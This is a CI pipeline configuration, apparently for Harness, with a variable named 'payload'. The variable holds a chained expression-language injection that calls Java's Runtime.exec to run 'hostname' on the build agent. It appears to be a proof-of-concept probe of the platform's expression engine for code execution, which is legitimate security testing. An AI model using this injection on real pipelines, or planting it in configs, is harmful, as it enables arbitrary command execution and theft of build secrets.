pipeline:
  name: Teava5
  identifier: Teava5
  projectIdentifier: default_project
  orgIdentifier: default
  tags: {}
  stages:
    - stage:
        name: Stagiu5
        identifier: Stagiu5
        description: ""
        type: CI
        spec:
          cloneCodebase: true
          caching:
            enabled: true
            override: true
          buildIntelligence:
            enabled: true
          platform:
            os: Linux
            arch: Amd64
          runtime:
            type: Cloud
            spec: {}
          execution:
            steps:
              - step:
                  type: Run
                  name: Run_1
                  identifier: Run_1
                  spec:
                    shell: Sh
                    command: hostname
        variables:
          - name: payload
            type: String
            description: ""
            required: false
            value: <+<+<+<+<+<+<+'some'>.getClass()>.forName('java.lang.runtime')>.getRuntime()>.exec('hostname')>.getInputStream()>/readAllBytes()>
        delegateSelectors:
          - docker-delegate-2
        sendGitStatus:
          enabled: true
          name: ""
  properties:
    ci:
      codebase:
        connectorRef: Git
        repoName: harness2
        build: <+input>
